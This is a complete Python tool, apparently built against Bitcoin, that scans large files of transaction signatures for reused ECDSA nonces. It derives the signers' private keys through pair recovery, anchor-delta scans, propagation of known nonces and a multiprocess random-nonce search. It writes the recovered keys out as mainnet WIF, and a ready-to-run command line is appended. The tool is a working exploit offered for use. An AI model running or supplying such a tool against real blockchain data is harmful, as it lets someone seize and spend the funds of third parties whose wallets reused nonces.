#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ecdsa_recover_ultra.py — Ultra ECDSA dup-R recovery with delta/anchor acceleration

Key features
- PASS0: 256 r-buckets + streaming dedup by (txid,vin,pub,r,s) (optional merged dedup file)
- PASS1: recovery
    * primary per-(r,pub) (>=2 sigs), both (s1-s2) and (s1+s2) paths
    * NEW: mixed per-r with Delta/Anchor scan:
        - pick an anchor signature per r and compute k for every other signature using Δs/Δz
        - validate (d,k) on both signatures; honor pub if provided
        - O(n) per r instead of O(n²)
    * collect k-candidates for r (also add N-k)
    * export dupR_clusters.jsonl & r_collisions.jsonl
    * write delta insights to out-deltas (pairs/hits per r)
- PASS2: iterative propagation: expand k from recovered privs; propagate known k across dataset
- Random-k (multiprocessing) over top hot-r
- Robust WIF; resumable bucketization

Inputs (JSONL per line):
  {"txid": "...", "vin": 0, "pubkey_hex": "<33/65 hex or empty>", "r":"...", "s":"...", "z":"..."}

Outputs:
  recovered_keys.jsonl / recovered_keys.txt
  recovered_k.jsonl
  dupR_clusters.jsonl
  r_collisions.jsonl
  delta_insights.jsonl
"""

import os, sys, json, argparse, time, random, hashlib, shutil
from collections import defaultdict, Counter
from itertools import combinations
from typing import Dict, Any, List, Tuple, Set, Iterable, Optional
from multiprocessing import Pool, get_context, cpu_count

# ---------------- deps ----------------
try:
    from coincurve import PrivateKey, PublicKey
except Exception as e:
    print("[fatal] coincurve not available. pip install coincurve (requires libsecp256k1).", file=sys.stderr)
    raise

# ---------------- secp256k1 ----------------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
def inv(x: int) -> int: return pow(x, -1, N)

# ---------------- base58 (WIF) ----------------
_B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
def b58encode(b: bytes) -> str:
    n = int.from_bytes(b, 'big'); s = ""
    while n:
        n, r = divmod(n, 58); s = _B58[r] + s
    return "1"*(len(b)-len(b.lstrip(b'\0'))) + s

def to_wif(d: int, compressed: bool=True, mainnet: bool=True) -> str:
    prefix = b"\x80" if mainnet else b"\xEF"
    payload = prefix + d.to_bytes(32, "big") + (b"\x01" if compressed else b"")
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return b58encode(payload + chk)

def derive_pub_hex(d: int) -> Tuple[str,str]:
    pk = PrivateKey(d.to_bytes(32, "big")).public_key
    return pk.format(compressed=True).hex().lower(), pk.format(compressed=False).hex().lower()

def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
    try:
        if not (1 <= s < N and 1 <= r < N and 1 <= d < N and 1 <= k < N): return False
        return (inv(k) * ((z + (r*d) % N) % N)) % N == (s % N)
    except Exception:
        return False

# ---------------- helpers ----------------
def as_hexint(v: Any) -> Optional[int]:
    if v is None: return None
    if isinstance(v, int): return v
    s = str(v).strip().lower()
    if s.startswith('"') and s.endswith('"'): s = s[1:-1]
    if s.startswith("0x"): s = s[2:]
    try: return int(s, 16)
    except Exception: return None

def norm_pub(s: Any) -> str:
    if s is None: return ""
    t = str(s).strip().lower()
    if t.startswith('"') and t.endswith('"'): t = t[1:-1]
    return t

def stream_jsonl(path: str) -> Iterable[Dict[str, Any]]:
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            if line.startswith('"') and line.endswith('"'): line=line[1:-1]
            try:
                j=json.loads(line)
                if isinstance(j, dict): yield j
            except Exception:
                continue

def r_bucket_index(r_hex: str) -> int:
    try:
        s=r_hex.lower().lstrip().removeprefix("0x")
        if len(s)<2: return 0
        return int(s[:2],16)
    except Exception:
        return 0

def ensure_dir(p: str): os.makedirs(p, exist_ok=True)

# ---------------- PASS0: bucketize + (optional) merge-dedup ----------------
def bucketize_and_optional_dedup(
    sigs_in: str,
    tmp_dir: str,
    dedup_out: Optional[str],
    rlist_path: Optional[str],
    resume: bool=False,
    verbose: bool=True
) -> List[str]:
    """
    Create 256 bucket files tmp_dir/bXX.jsonl.
    If resume=True and tmp_dir seems populated, skip rebuild.
    If dedup_out provided -> also merge deduped content into that file after bucket pass.
    Writes rlist_path with all r’s (hex, 64 chars).
    """
    if os.path.exists(tmp_dir):
        if resume:
            print("[pass0] resume: using existing buckets.")
        else:
            shutil.rmtree(tmp_dir)
    ensure_dir(tmp_dir)

    bucket_paths = [os.path.join(tmp_dir, f"b{idx:02x}.jsonl") for idx in range(256)]
    if not resume:
        bucket_files: Dict[int, Any] = {}
        r_seen: Set[str] = set()
        total = 0
        t0=time.time()
        for j in stream_jsonl(sigs_in):
            r_hex = (j.get("r") or "").strip().lower()
            s_hex = (j.get("s") or "").strip().lower()
            z_hex = (j.get("z") or "").strip().lower()
            txid  = (j.get("txid") or "").strip().lower()
            pub   = norm_pub(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey"))
            vin   = j.get("vin", 0)
            if not r_hex or not s_hex or not z_hex or not txid:
                continue
            if as_hexint(r_hex) in (None,0) or as_hexint(s_hex) in (None,0) or as_hexint(z_hex) in (None,0):
                continue
            try: vin=int(vin)
            except: vin=0
            bidx = r_bucket_index(r_hex)
            if bidx not in bucket_files:
                bucket_files[bidx] = open(bucket_paths[bidx], "a", encoding="utf-8")
            bucket_files[bidx].write(json.dumps({
                "txid": txid, "vin": vin, "pubkey_hex": pub,
                "r": r_hex, "s": s_hex, "z": z_hex
            })+"\n")
            total += 1
            if r_hex not in r_seen:
                r_seen.add(r_hex)
            if verbose and total % 250000 == 0:
                print(f"[pass0] lines={total:,} unique_r≈{len(r_seen):,}")
        for f in bucket_files.values():
            f.close()
        if rlist_path:
            with open(rlist_path,"w",encoding="utf-8") as rf:
                for r in r_seen:
                    rf.write(r.rjust(64,'0')+"\n")
        print(f"[pass0] done. lines={total:,} unique_r={len(r_seen):,} in {time.time()-t0:.1f}s")
    else:
        if rlist_path:
            r_seen=set()
            for b in bucket_paths:
                if not os.path.exists(b): continue
                for j in stream_jsonl(b):
                    r_seen.add((j.get("r") or "").strip().lower().rjust(64,'0'))
            with open(rlist_path,"w",encoding="utf-8") as rf:
                for r in r_seen: rf.write(r+"\n")
            print(f"[pass0-resume] unique_r≈{len(r_seen):,}")

    # Optional merge-dedup
    if dedup_out:
        if os.path.exists(dedup_out): os.remove(dedup_out)
        for idx, b in enumerate(bucket_paths):
            if not os.path.exists(b): continue
            keyset:Set[Tuple[str,int,str,str,str]]=set()
            kept=0
            for j in stream_jsonl(b):
                key=(j["txid"], int(j["vin"]), norm_pub(j.get("pubkey_hex")), j["r"], j["s"])
                if key in keyset: continue
                keyset.add(key)
                with open(dedup_out,"a",encoding="utf-8") as out:
                    out.write(json.dumps(j)+"\n")
                kept += 1
            print(f"[pass0-dedup] bucket {idx:02x}: kept={kept:,}")

    return bucket_paths

# ---------------- recover from pair ----------------
def recover_from_pair(r: int, a: Dict[str,Any], b: Dict[str,Any]) -> List[Tuple[int,int,str]]:
    s1,s2,z1,z2=a["s"],b["s"],a["z"],b["z"]; out=[]
    denom=(s1-s2)%N
    if denom!=0:
        k=((z1-z2)*inv(denom))%N
        d=((s1*k - z1)*inv(r))%N
        if 1<=d<N and k!=0: out.append((d,k,"diff"))
    denom2=(s1+s2)%N
    if denom2!=0:
        k2=((z1+z2)*inv(denom2))%N
        d2=((s1*k2 - z1)*inv(r))%N
        if 1<=d2<N and k2!=0: out.append((d2,k2,"sum"))
    return out

def add_k_candidate(r:int,k:int,store:Dict[int,Set[int]]):
    if k and 0<k<N:
        store.setdefault(r,set()).add(k)
        store[r].add((N-k)%N)

# ---------------- DELTA/ANCHOR SCAN ----------------
def anchor_delta_scan_for_r(
    r_val: int,
    lst: List[Dict[str,Any]],
    recovered_priv_by_pub: Dict[str,int],
    recovered_k_by_r: Dict[int, Set[int]],
    out_json: str, out_txt: str,
    out_deltas: Optional[str]=None
) -> int:
    """
    Pick one anchor 'a' in this r-bucket and iterate others 'b' to compute k via Δs/Δz (both diff & sum paths).
    Validate (d,k) on both; honor pub if provided; push recovered priv & k candidates.
    Return number of newly recovered keys for this r.
    """
    if len(lst) < 2: return 0
    # Choose anchor that has pub (if any) to tighten validation
    anchor = None
    for rec in lst:
        if rec["pub"]:
            anchor = rec; break
    if anchor is None:
        anchor = lst[0]
    hits=0; pairs=0

    for b in lst:
        if b is anchor: continue
        # try both paths via recover_from_pair with (a,b)
        for d,k,why in recover_from_pair(r_val, anchor, b):
            pairs += 1
            # must validate on both
            if not (ecdsa_ok(anchor["s"],anchor["z"],r_val,d,k) and ecdsa_ok(b["s"],b["z"],r_val,d,k)):
                continue
            try: pk_c,pk_u = derive_pub_hex(d)
            except: continue
            ok=True
            if anchor["pub"]:
                ok &= (anchor["pub"] in (pk_c,pk_u))
            if b["pub"]:
                ok &= (b["pub"] in (pk_c,pk_u))
            if not ok: continue
            pub_final = anchor["pub"] or b["pub"] or pk_c
            if pub_final not in recovered_priv_by_pub:
                recovered_priv_by_pub[pub_final]=d
                wif=to_wif(d,True,True)
                with open(out_json,"a",encoding="utf-8") as fj:
                    fj.write(json.dumps({
                        "pubkey":pub_final,"priv_hex":f"{d:064x}","wif":wif,"r":f"{r_val:064x}",
                        "proof":[{"txid":anchor["txid"],"vin":anchor["vin"]},{"txid":b["txid"],"vin":b["vin"]}],
                        "method":f"delta-anchor-{why}"
                    })+"\n")
                with open(out_txt,"a",encoding="utf-8") as ft:
                    ft.write(f"PUB={pub_final} PRIV={d:064x} WIF={wif} R={r_val:064x} via {anchor['txid']}:{anchor['vin']} & {b['txid']}:{b['vin']} (delta-anchor-{why})\n")
                print("="*62)
                print(f"[RECOVERED] pub={pub_final}")
                print(f"  d (hex): {d:064x}")
                print(f"  WIF   : {wif}")
                print(f"  via   : {anchor['txid']}:{anchor['vin']}  &  {b['txid']}:{b['vin']}  ({why}, delta-anchor)")
                print("="*62)
                hits+=1
            add_k_candidate(r_val,k,recovered_k_by_r)

    if out_deltas:
        with open(out_deltas,"a",encoding="utf-8") as fd:
            fd.write(json.dumps({
                "r": f"{r_val:064x}",
                "anchor_txid": anchor["txid"], "anchor_vin": anchor["vin"],
                "pairs_tested": pairs, "hits": hits
            })+"\n")
    return hits

# ---------------- PASS1: per-bucket clustering & recovery ----------------
def per_bucket_process(
    bpath: str,
    recovered_priv_by_pub: Dict[str,int],
    recovered_k_by_r: Dict[int, Set[int]],
    dup_clusters_out: Optional[str],
    r_collisions_out: Optional[str],
    out_json: str, out_txt: str,
    hot_counts: List[Tuple[int,int]],
    pair_cap: int = 200,
    out_deltas: Optional[str]=None,
    verbose: bool = True,
):
    if not os.path.exists(bpath): return
    rows=[]
    # dedup inside bucket
    seen:Set[Tuple[str,int,str,str,str]]=set()
    r_freq=Counter()
    for j in stream_jsonl(bpath):
        key=(j["txid"], int(j["vin"]), norm_pub(j.get("pubkey_hex")), j["r"], j["s"])
        if key in seen: continue
        seen.add(key)
        r=as_hexint(j["r"]); s=as_hexint(j["s"]); z=as_hexint(j["z"])
        if None in (r,s,z): continue
        pub=norm_pub(j.get("pubkey_hex"))
        rows.append({"txid":j["txid"],"vin":int(j["vin"]), "r":r,"s":s,"z":z,"pub":pub})
        r_freq[r]+=1

    # groupings
    groups=defaultdict(list)           # (r,pub)->list
    per_r=defaultdict(list)            # r->all rows (pub may be empty)
    per_r_pub=defaultdict(lambda: defaultdict(list))  # r->pub->rows
    for rec in rows:
        groups[(rec["r"], rec["pub"])].append(rec)
        per_r[rec["r"]].append(rec)
        per_r_pub[rec["r"]][rec["pub"]].append(rec)

    # reports
    if dup_clusters_out:
        with open(dup_clusters_out,"a",encoding="utf-8") as f:
            for (r_val,pub), lst in groups.items():
                if pub and len(lst)>=2:
                    f.write(json.dumps({
                        "r": f"{r_val:064x}",
                        "pubkey": pub,
                        "count": len(lst),
                        "sightings": [{"txid":x["txid"],"vin":x["vin"]} for x in lst]
                    })+"\n")
    if r_collisions_out:
        with open(r_collisions_out,"a",encoding="utf-8") as f:
            for r_val, mp in per_r_pub.items():
                pubs=[p for p in mp.keys() if p]
                if len(pubs)>=2:
                    f.write(json.dumps({
                        "r": f"{r_val:064x}",
                        "pubs": pubs,
                        "distinct_pubs": len(pubs),
                        "total_sightings": sum(len(v) for v in mp.values())
                    })+"\n")

    found_here=0

    # A) primary per-(r,pub) clusters (>=2)
    for (r_val, pub), lst in groups.items():
        if len(lst)<2 or not pub: continue
        for a,b in combinations(lst,2):
            for d,k,why in recover_from_pair(r_val,a,b):
                if not (ecdsa_ok(a["s"],a["z"],r_val,d,k) and ecdsa_ok(b["s"],b["z"],r_val,d,k)): continue
                try: pk_c,pk_u=derive_pub_hex(d)
                except: continue
                if pub not in (pk_c,pk_u): continue
                if pub not in recovered_priv_by_pub:
                    recovered_priv_by_pub[pub]=d
                    wif=to_wif(d,True,True)
                    with open(out_json,"a",encoding="utf-8") as fj:
                        fj.write(json.dumps({
                            "pubkey":pub,"priv_hex":f"{d:064x}","wif":wif,"r":f"{r_val:064x}",
                            "proof":[{"txid":a["txid"],"vin":a["vin"]},{"txid":b["txid"],"vin":b["vin"]}],
                            "method":f"primary-{why}"
                        })+"\n")
                    with open(out_txt,"a",encoding="utf-8") as ft:
                        ft.write(f"PUB={pub} PRIV={d:064x} WIF={wif} R={r_val:064x} via {a['txid']}:{a['vin']} & {b['txid']}:{b['vin']} (primary-{why})\n")
                    print("="*62)
                    print(f"[RECOVERED] pub={pub}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
                    print("="*62)
                    found_here+=1
                add_k_candidate(r_val,k,recovered_k_by_r)
                try:
                    ka=((a["z"] + (r_val*d)%N)%N)*inv(a["s"])%N
                    kb=((b["z"] + (r_val*d)%N)%N)*inv(b["s"])%N
                    add_k_candidate(r_val,ka,recovered_k_by_r)
                    add_k_candidate(r_val,kb,recovered_k_by_r)
                except: pass

    # B) NEW: delta/anchor scan per-r (fast O(n) k derivation via Δs/Δz)
    for r_val, lst in per_r.items():
        if len(lst) < 2: continue
        found_here += anchor_delta_scan_for_r(
            r_val, lst,
            recovered_priv_by_pub, recovered_k_by_r,
            out_json, out_txt,
            out_deltas=out_deltas
        )

    # C) fallback limited random pairs (mixed) — still useful as safety net
    for r_val, lst in per_r.items():
        if len(lst) < 2: continue
        import random as pyrand
        idxs=list(range(len(lst)))
        for _ in range(min(len(lst)*(len(lst)-1)//2, max(0, pair_cap))):
            a,b = pyrand.sample(idxs,2)
            A,B = lst[a], lst[b]
            for d,k,why in recover_from_pair(r_val,A,B):
                if not (ecdsa_ok(A["s"],A["z"],r_val,d,k) and ecdsa_ok(B["s"],B["z"],r_val,d,k)): continue
                try: pk_c,pk_u=derive_pub_hex(d)
                except: continue
                ok=True
                if A["pub"]: ok &= (A["pub"] in (pk_c,pk_u))
                if B["pub"]: ok &= (B["pub"] in (pk_c,pk_u))
                if not ok: continue
                pub_final = A["pub"] or B["pub"] or pk_c
                if pub_final not in recovered_priv_by_pub:
                    recovered_priv_by_pub[pub_final]=d
                    wif=to_wif(d,True,True)
                    with open(out_json,"a",encoding="utf-8") as fj:
                        fj.write(json.dumps({
                            "pubkey":pub_final,"priv_hex":f"{d:064x}","wif":wif,"r":f"{r_val:064x}",
                            "proof":[{"txid":A["txid"],"vin":A["vin"]},{"txid":B["txid"],"vin":B["vin"]}],
                            "method":f"primary-mixed-{why}"
                        })+"\n")
                    with open(out_txt,"a",encoding="utf-8") as ft:
                        ft.write(f"PUB={pub_final} PRIV={d:064x} WIF={wif} R={r_val:064x} via {A['txid']}:{A['vin']} & {B['txid']}:{B['vin']} (primary-mixed-{why})\n")
                    print("="*62)
                    print(f"[RECOVERED] pub={pub_final}")
                    print(f"  d (hex): {d:064x}")
                    print(f"  WIF   : {wif}")
                    print(f"  via   : {A['txid']}:{A['vin']}  &  {B['txid']}:{B['vin']}  ({why}, mixed)")
                    print("="*62)
                    found_here+=1
                add_k_candidate(r_val,k,recovered_k_by_r)

    # collect hot r stats
    for r,cnt in r_freq.items():
        hot_counts.append((cnt, r))

    if verbose:
        print(f"[pass1 {os.path.basename(bpath)}] rows={len(rows):,} found={found_here}")

# ---------------- PASS2: propagation over full file ----------------
def expand_k_from_privs_over_file(sigs_file: str,
                                  recovered_priv_by_pub: Dict[str,int],
                                  recovered_k_by_r: Dict[int, Set[int]]) -> int:
    added=0
    for j in stream_jsonl(sigs_file):
        pub=norm_pub(j.get("pubkey_hex"))
        if not pub or pub not in recovered_priv_by_pub: continue
        r=as_hexint(j.get("r")); s=as_hexint(j.get("s")); z=as_hexint(j.get("z"))
        if None in (r,s,z): continue
        d=recovered_priv_by_pub[pub]
        try:
            k=((z + (r*d)%N)%N)*inv(s)%N
        except Exception:
            continue
        before=len(recovered_k_by_r.get(r,set()))
        add_k_candidate(r,k,recovered_k_by_r)
        after=len(recovered_k_by_r.get(r,set()))
        added += (after-before)
    return added

def propagate_with_known_k_over_file(sigs_file:str,
                                     recovered_priv_by_pub:Dict[str,int],
                                     recovered_k_by_r:Dict[int,Set[int]],
                                     out_json:str,out_txt:str)->int:
    new_count=0
    for j in stream_jsonl(sigs_file):
        pub=norm_pub(j.get("pubkey_hex"))
        if pub and pub in recovered_priv_by_pub: continue
        r=as_hexint(j.get("r")); s=as_hexint(j.get("s")); z=as_hexint(j.get("z"))
        if None in (r,s,z): continue
        kset=recovered_k_by_r.get(r,set())
        if not kset: continue
        for k in list(kset):
            try:
                d=((s*k - z)*inv(r))%N
                if not (1<=d<N): continue
                pk_c,pk_u=derive_pub_hex(d)
                if pub and (pub not in (pk_c,pk_u)): continue
                if not ecdsa_ok(s,z,r,d,k): continue
            except Exception:
                continue
            pub_final = pub or pk_c
            if pub_final in recovered_priv_by_pub: break
            recovered_priv_by_pub[pub_final]=d
            wif=to_wif(d,True,True)
            with open(out_json,"a",encoding="utf-8") as fj:
                fj.write(json.dumps({
                    "pubkey":pub_final,"priv_hex":f"{d:064x}","wif":wif,"r":f"{r:064x}",
                    "proof":[{"txid":j.get("txid",""),"vin":int(j.get("vin",0))}],
                    "method":"propagate-from-r"
                })+"\n")
            with open(out_txt,"a",encoding="utf-8") as ft:
                ft.write(f"PUB={pub_final} PRIV={d:064x} WIF={wif} R={r:064x} via {j.get('txid','')}:{int(j.get('vin',0))} (propagate-from-r)\n")
            print("="*62)
            print(f"[RECOVERED via propagation] pub={pub_final}")
            print(f"  d (hex): {d:064x}")
            print(f"  WIF   : {wif}")
            print(f"  via   : {j.get('txid','')}:{int(j.get('vin',0))} (r={r:064x})")
            print("="*62)
            new_count+=1
            break
    return new_count

# ---------------- preload/save recovered_k ----------------
def preload_k_file(path:str, recovered_k_by_r:Dict[int,Set[int]])->int:
    if not path or not os.path.exists(path): return 0
    adds=0
    for j in stream_jsonl(path):
        r=as_hexint(j.get("r"))
        if r is None: continue
        for ks in j.get("k_candidates") or []:
            k=as_hexint(ks)
            if k is None: continue
            before=len(recovered_k_by_r.get(r,set()))
            add_k_candidate(r,k,recovered_k_by_r)
            after=len(recovered_k_by_r.get(r,set()))
            adds += (after-before)
    print(f"[preload-k] r-buckets={len(recovered_k_by_r)} additions≈{adds}")
    return adds

def save_k_file(path:str, recovered_k_by_r:Dict[int,Set[int]]):
    with open(path,"w",encoding="utf-8") as f:
        for r,kset in recovered_k_by_r.items():
            if not kset: continue
            f.write(json.dumps({
                "r": f"{r:064x}",
                "k_candidates":[f"{k:064x}" for k in sorted(kset)]
            })+"\n")

# ---------------- multiprocessing random-k ----------------
def _rand_worker(args):
    r_val, sigs, tries, rng_limit, seed = args
    rnd = random.Random(seed)
    outs=[]; tried=0; seen_privs=set()
    while tried<tries:
        k=rnd.randrange(1, min(rng_limit, N))
        for sig in sigs:
            s,z,pub,txid,vin = sig["s"],sig["z"],sig["pub"],sig["txid"],sig["vin"]
            try:
                d=((s*k - z)*inv(r_val))%N
                if not (1<=d<N): continue
                if d in seen_privs: continue
                pk_c,pk_u=derive_pub_hex(d)
                if pub and (pub not in (pk_c,pk_u)): continue
                if not ecdsa_ok(s,z,r_val,d,k): continue
                seen_privs.add(d)
                outs.append({"pubkey": pub or pk_c, "priv": d, "r": r_val,
                             "k": k, "proof":[{"txid":txid,"vin":vin}]})
            except Exception:
                continue
        tried+=1
    return (r_val, outs, tried)

def random_k_scan(
    sigs_file: str,
    top_r: List[int],
    per_bucket: int,
    rng_limit: int,
    processes: int,
    seed: int,
    recovered_priv_by_pub: Dict[str,int],
    out_json: str, out_txt: str,
    force: bool=False
)->Tuple[int,Dict[int,int]]:
    if per_bucket<=0 or not top_r: return 0, {}
    # collect only needed r’s
    target=set(top_r)
    sigs_by_r=defaultdict(list)
    for j in stream_jsonl(sigs_file):
        r=as_hexint(j.get("r")); s=as_hexint(j.get("s")); z=as_hexint(j.get("z"))
        if r not in target or None in (s,z): continue
        pub=norm_pub(j.get("pubkey_hex"))
        sigs_by_r[r].append({"s":s,"z":z,"pub":pub,"txid":j.get("txid",""),"vin":int(j.get("vin",0))})
    present=sum(len(v) for v in sigs_by_r.values())
    if present==0 and not force: return 0, {}

    print(f"[random-k] processes={processes}, per-bucket={per_bucket}, top={len(top_r)}, range={rng_limit}, seed={seed}")
    ctx = get_context("fork") if sys.platform!="win32" else get_context("spawn")
    tasks=[]
    base_seed = seed if seed else int(time.time())
    for idx,r_val in enumerate(top_r):
        srows=sigs_by_r.get(r_val,[])
        if not srows: continue
        tseed=(base_seed ^ (r_val & 0xffffffff) ^ (idx*0x9e3779b1)) & 0xffffffff
        tasks.append((r_val, srows, per_bucket, rng_limit, tseed))

    new_keys=0; tried_map={}
    with ctx.Pool(processes=max(1,processes)) as pool:
        for r_val, outs, tried in pool.imap_unordered(_rand_worker, tasks, chunksize=1):
            tried_map[r_val]=tried
            for rec in outs:
                pub=rec["pubkey"]; d=rec["priv"]
                if pub in recovered_priv_by_pub: continue
                recovered_priv_by_pub[pub]=d
                wif=to_wif(d,True,True)
                with open(out_json,"a",encoding="utf-8") as fj:
                    fj.write(json.dumps({
                        "pubkey":pub,"priv_hex":f"{d:064x}","wif":wif,"r":f"{rec['r']:064x}",
                        "proof":rec["proof"],"method":"random-k"
                    })+"\n")
                with open(out_txt,"a",encoding="utf-8") as ft:
                    p=rec["proof"][0]; ft.write(f"PUB={pub} PRIV={d:064x} WIF={wif} R={rec['r']:064x} via {p['txid']}:{p['vin']} (random-k)\n")
                print("="*62)
                print(f"[RECOVERED via random-k] pub={pub}")
                print(f"  d (hex): {d:064x}")
                print(f"  WIF   : {wif}")
                print(f"  via   : {rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} (r={rec['r']:064x})")
                print("="*62)
                new_keys+=1
    return new_keys, tried_map

# ---------------- CLI ----------------
def main():
    ap = argparse.ArgumentParser(description="Ultra ECDSA recovery (bucketed dedup, primary+(mixed), delta/anchor, propagation, random-k)")
    # IO defaults
    ap.add_argument("--sigs", default="signatures.jsonl", help="input JSONL of signatures")
    ap.add_argument("--work-dedup", default="signatures_dedup.jsonl", help="merged dedup file (recommended)")
    ap.add_argument("--tmp-dir", default=".r_buckets", help="dir for 256 buckets")
    ap.add_argument("--rlist", default="r_values.txt", help="write all r values here")
    ap.add_argument("--export-clusters", default="dupR_clusters.jsonl", help="(r,pub) clusters with count>=2")
    ap.add_argument("--report-collisions", default="r_collisions.jsonl", help="same r across >=2 pubs")
    ap.add_argument("--out-json", default="recovered_keys.jsonl", help="recovered keys JSONL")
    ap.add_argument("--out-txt", default="recovered_keys.txt", help="recovered keys TXT")
    ap.add_argument("--out-k", default="recovered_k.jsonl", help="recovered k candidates per r (JSONL)")
    ap.add_argument("--preload-k", default="recovered_k.jsonl", help="preload k candidates if file exists")
    ap.add_argument("--out-deltas", default="delta_insights.jsonl", help="delta/anchor scan stats per r")

    # controls
    ap.add_argument("--max-iter", type=int, default=3, help="max propagation iterations")
    ap.add_argument("--no-merge-dedup", action="store_true", help="do NOT create merged dedup file (use original for pass2)")
    ap.add_argument("--keep-buckets", action="store_true", help="do not delete bucket dir at end")
    ap.add_argument("--resume", action="store_true", help="reuse existing buckets if present (skip rebuild)")
    ap.add_argument("--rebuild-buckets", action="store_true", help="force rebuild buckets (overrides --resume)")
    ap.add_argument("--pair-cap", type=int, default=200, help="extra mixed-pair trials cap per r (safety net)")

    # random-k
    ap.add_argument("--scan-random-k", type=int, default=0, help="tries per hot r (0=disabled)")
    ap.add_argument("--scan-random-k-top", type=int, default=64, help="how many hottest r buckets")
    ap.add_argument("--scan-random-k-range", type=int, default=(1<<64), help="random k range upper bound (<=N)")
    ap.add_argument("--processes", type=int, default=max(1, cpu_count()//2), help="processes for random-k")
    ap.add_argument("--rand-seed", type=int, default=1337, help="random seed")
    ap.add_argument("--force-random-k", action="store_true", help="run random-k even if no sigs collected for targets")

    args = ap.parse_args()

    # Cleanup outputs
    for p in [args.out_json, args.out_txt, args.out_k, args.export_clusters, args.report_collisions, args.out_deltas]:
        if p and os.path.exists(p): os.remove(p)

    # PASS0
    if args.rebuild_buckets:
        if os.path.exists(args.tmp_dir): shutil.rmtree(args.tmp_dir)
        resume=False
    else:
        resume=args.resume
    print("[pass0] bucketize & (optional) merge-dedup…")
    bucket_paths = bucketize_and_optional_dedup(
        args.sigs, args.tmp_dir,
        None if args.no_merge_dedup else args.work_dedup,
        args.rlist,
        resume=resume,
        verbose=True
    )
    work_file = args.sigs if args.no_merge_dedup else args.work_dedup

    # PASS1: per-bucket processing
    print("[pass1] clusters & recovery (primary + delta/anchor + mixed)…")
    recovered_priv_by_pub: Dict[str,int] = {}
    recovered_k_by_r: Dict[int, Set[int]] = defaultdict(set)
    # preload k
    if args.preload_k and os.path.exists(args.preload_k):
        preload_k_file(args.preload_k, recovered_k_by_r)

    hot_counts: List[Tuple[int,int]] = []  # (count, r)
    for bpath in bucket_paths:
        if not os.path.exists(bpath): continue
        per_bucket_process(
            bpath,
            recovered_priv_by_pub,
            recovered_k_by_r,
            args.export_clusters,
            args.report_collisions,
            args.out_json, args.out_txt,
            hot_counts,
            pair_cap=args.pair_cap,
            out_deltas=args.out_deltas,
            verbose=True
        )
    # save k after pass1
    save_k_file(args.out_k, recovered_k_by_r)

    # hot r set (global)
    hot_counts_sorted = sorted(hot_counts, reverse=True)
    seen_r=set(); top_r=[]
    for cnt,r in hot_counts_sorted:
        if r in seen_r: continue
        seen_r.add(r); top_r.append(r)
        if len(top_r) >= max(0, args.scan_random_k_top): break

    # PASS2: iterative propagation over full file (work_file)
    print("[pass2] iterative propagation over full file…")
    for it in range(1, args.max_iter+1):
        grew_k = expand_k_from_privs_over_file(work_file, recovered_priv_by_pub, recovered_k_by_r)
        grew_keys = propagate_with_known_k_over_file(work_file, recovered_priv_by_pub, recovered_k_by_r, args.out_json, args.out_txt)
        save_k_file(args.out_k, recovered_k_by_r)
        print(f"[iter {it}] grew_k={grew_k}, grew_keys={grew_keys}")
        if grew_k==0 and grew_keys==0: break

    # RANDOM-K
    if args.scan_random_k>0 and top_r:
        new_keys, tried_map = random_k_scan(
            work_file, top_r, args.scan_random_k, args.scan_random_k_range,
            max(1,args.processes), args.rand_seed, recovered_priv_by_pub,
            args.out_json, args.out_txt, force=args.force_random_k
        )
        print(f"[random-k] new keys: {new_keys}")
    else:
        print("[random-k] disabled or no hot r’s")

    # final dump
    save_k_file(args.out_k, recovered_k_by_r)

    if not args.keep_buckets and os.path.exists(args.tmp_dir):
        shutil.rmtree(args.tmp_dir)

    print("\nDone.")
    print(f"Recovered keys -> {args.out_json} / {args.out_txt}")
    print(f"Recovered k    -> {args.out_k}")
    print(f"dupR clusters  -> {args.export_clusters}")
    print(f"r collisions   -> {args.report_collisions}")
    print(f"delta insights -> {args.out_deltas}")
    return

if __name__ == "__main__":
    main()


'''

python3 ecdsa_recover_ultra.py \
  --sigs signatures.jsonl \
  --tmp-dir .r_buckets \
  --rlist r_values.txt \
  --export-clusters dupR_clusters.jsonl \
  --report-collisions r_collisions.jsonl \
  --out-json recovered_keys.jsonl \
  --out-txt recovered_keys.txt \
  --out-k recovered_k.jsonl \
  --preload-k recovered_k.jsonl \
  --max-iter 2 \
  --pair-cap 300 \
  --scan-random-k 250000 \
  --scan-random-k-top 64 \
  --scan-random-k-range 115792089237316195423570985008687907852837564279074904382605163141518161494337 \
  --processes $(nproc) \
  --rand-seed 0

'''
